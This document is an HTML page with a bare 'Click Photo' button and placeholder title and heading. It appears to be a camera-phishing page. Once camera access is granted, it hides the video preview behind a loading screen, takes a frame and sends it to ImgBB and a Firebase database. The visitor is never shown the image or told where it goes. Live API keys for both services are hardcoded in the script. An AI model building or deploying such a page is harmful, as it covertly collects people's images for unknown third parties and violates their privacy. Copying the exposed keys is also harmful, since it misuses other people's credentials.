<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture ...</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            margin-top: 50px; 
        }
        button { 
            padding: 15px 30px; 
            font-size: 18px; 
            cursor: pointer; 
            background: #007bff; 
            color: white; 
            border: none; 
            border-radius: 5px;
        }
        button:hover { 
            background: #0056b3; 
        }

        /* Loading Screen Styles */
        #loadingOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); /* Dark semi-transparent background */
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .hidden { 
            display: none !important; 
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #007bff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #loadingText {
            font-size: 22px;
            font-weight: bold;
        }

        /* Hidden elements used for capturing */
        #videoElement { display: none; }
        #canvasElement { display: none; }
    </style>
</head>
<body>

    <h1>......</h1>
    <button id="clickPhotoBtn">Click Photo</button>

    <!-- Full Screen Loading Overlay -->
    <div id="loadingOverlay" class="hidden">
        <div id="spinner" class="spinner"></div>
        <p id="loadingText">Loading please wait sometime...</p>
    </div>

    <!-- Hidden video and canvas to capture the photo in the background -->
    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement"></canvas>

    <script type="module">
        // Import Firebase modules
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDUHXK7NYeM6CLNN4fsyGVz1MpIVpJuOq0",
            authDomain: "studio-vddd5.firebaseapp.com",
            databaseURL: "https://studio-vddd5-default-rtdb.firebaseio.com",
            projectId: "studio-vddd5",
            storageBucket: "studio-vddd5.firebasestorage.app",
            messagingSenderId: "679230106233",
            appId: "1:679230106233:web:3d6a91cabc2264e15902a8"
        };

        // Initialize Firebase and Realtime Database
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ImgBB API Key
        const IMGBB_API_KEY = "d6ae34a680665aa763e32a5be8fa083a";

        // DOM Elements
        const btn = document.getElementById("clickPhotoBtn");
        const video = document.getElementById("videoElement");
        const canvas = document.getElementById("canvasElement");
        const loadingOverlay = document.getElementById("loadingOverlay");
        const loadingText = document.getElementById("loadingText");
        const spinner = document.getElementById("spinner");

        btn.addEventListener("click", async () => {
            // 1. Show the loading screen immediately
            loadingOverlay.classList.remove("hidden");
            spinner.style.display = "block";
            loadingText.innerText = "Loading please wait sometime...";

            try {
                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // Wait for the video stream to load
                video.onloadedmetadata = () => {
                    video.play();
                    // Wait 1 second for the camera to adjust exposure/focus, then capture
                    setTimeout(() => captureAndUpload(stream), 1000);
                };
            } catch (error) {
                // If they deny permission or camera fails
                spinner.style.display = "none";
                loadingText.innerText = "Error: Camera permission denied or not available.";
                setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
            }
        });

        async function captureAndUpload(stream) {
            // Draw video frame to canvas
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop the camera
            stream.getTracks().forEach(track => track.stop());

            // Get base64 image data (remove the prefix "data:image/jpeg;base64,")
            const dataUrl = canvas.toDataURL("image/jpeg");
            const base64Image = dataUrl.split(",")[1];

            try {
                // 1. Upload to ImgBB
                const formData = new FormData();
                formData.append("key", IMGBB_API_KEY);
                formData.append("image", base64Image);

                const response = await fetch("https://api.imgbb.com/1/upload", {
                    method: "POST",
                    body: formData
                });
                
                const data = await response.json();

                if (data.success) {
                    const imageUrl = data.data.url;

                    // 2. Save URL to Firebase
                    const photosRef = ref(db, "photos");
                    await push(photosRef, {
                        url: imageUrl,
                        timestamp: Date.now()
                    });

                    // 3. Show "Complete" message and hide spinner
                    spinner.style.display = "none";
                    loadingText.innerText = "Complete!";

                    // Close the loading screen after 3 seconds so the page is ready again
                    setTimeout(() => {
                        loadingOverlay.classList.add("hidden");
                    }, 3000);

                } else {
                    spinner.style.display = "none";
                    loadingText.innerText = "Error uploading to ImgBB.";
                    setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
                }
            } catch (error) {
                spinner.style.display = "none";
                loadingText.innerText = "An error occurred: " + error.message;
                setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
            }
        }
    </script>
</body>
</html>
